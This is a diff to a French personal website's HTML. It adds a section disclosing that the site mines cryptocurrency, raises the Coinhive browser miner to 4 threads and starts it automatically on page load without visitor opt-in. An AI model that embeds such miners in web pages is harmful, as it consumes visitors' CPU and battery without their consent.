@@ -74,6 +74,7 @@
                 <li><a href="#photoandvideo">Photographie et vidéo</a></li>
                 <li><a href="#prgrm">Programmation</a></li>
                 <li><a href="#panart">Studio PanArt</a></li>
+                <li><a href="#coinhive">Coin hive</a></li>
                 <li role="separator" class="divider"></li>
                 <li><a href="#first">First Robotics</a></li>
                 <!-- <li class="dropdown-header">Futurs</li>
@@ -200,6 +201,22 @@
               
             </p>
           </div>
+          <div id="coinhive">
+            <h3>Coin hive</h3>
+            <p>
+              Ce site internet utilise la ressouce <a target="_blank" href="https://coin-hive.com">Coin hive</a> afin de générer des cryptos monnaies, pour cela il utilise les ressources de votre ordinateur afin d'exécuter l'algorithme de génération, cela peut potentiellement réduire les performances de votre navigateur. <br><br>
+              Cette session possède les caractéristiques suivants: <br>
+              <ul>
+                <li>Nombre de processus: <span id="mining-threads">0</span></li>
+                <br><br>
+                <li>Nombre de hashs/s: <span id="mining-hashes-per-second">0</span></li>
+                <br><br>
+                <li>Nombre de hashs total: <span id="mining-hashes-total">0</span></li>
+              </ul>
+              <br>
+              
+            </p>
+          </div>
           <div id="soutenir">
             <h3>Me soutenir</h3>
             <p>
@@ -263,9 +280,29 @@
   
     <!-- Coin-hive Miner reference -->
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script src="https://coin-hive.com/media/miner-ui.js"></script>
     <script type="text/javascript">
-      var miner = new CoinHive.Anonymous('pUhvRAMNDIW3dIVsUuRI9FfG7OOTgBLw');
+      var miner = new CoinHive.Anonymous('pUhvRAMNDIW3dIVsUuRI9FfG7OOTgBLw', {threads: 4});
       miner.start();
+      
+      setInterval(function() {
+	      var hashesPerSecond = miner.getHashesPerSecond();
+	      var totalHashes = miner.getTotalHashes();
+	      var acceptedHashes = miner.getAcceptedHashes();
+
+	      var ui = new MinerUI(miner, {
+		      //container: document.getElementById('miner'),
+		      //canvas: document.getElementById('mining-stats-canvas'),
+		      //hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+		      hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+		      threads: document.getElementById('mining-threads'),
+		      //threadsAdd: document.getElementById('mining-threads-add'),
+		      //threadsRemove: document.getElementById('mining-threads-remove'),
+		      hashesTotal: document.getElementById('mining-hashes-total'),
+		      //startButton: document.getElementById('mining-start'),
+		      //stopButton: document.getElementById('mining-stop')
+	      });
+      }, 1000);
     </script>
   </body>
 </html>
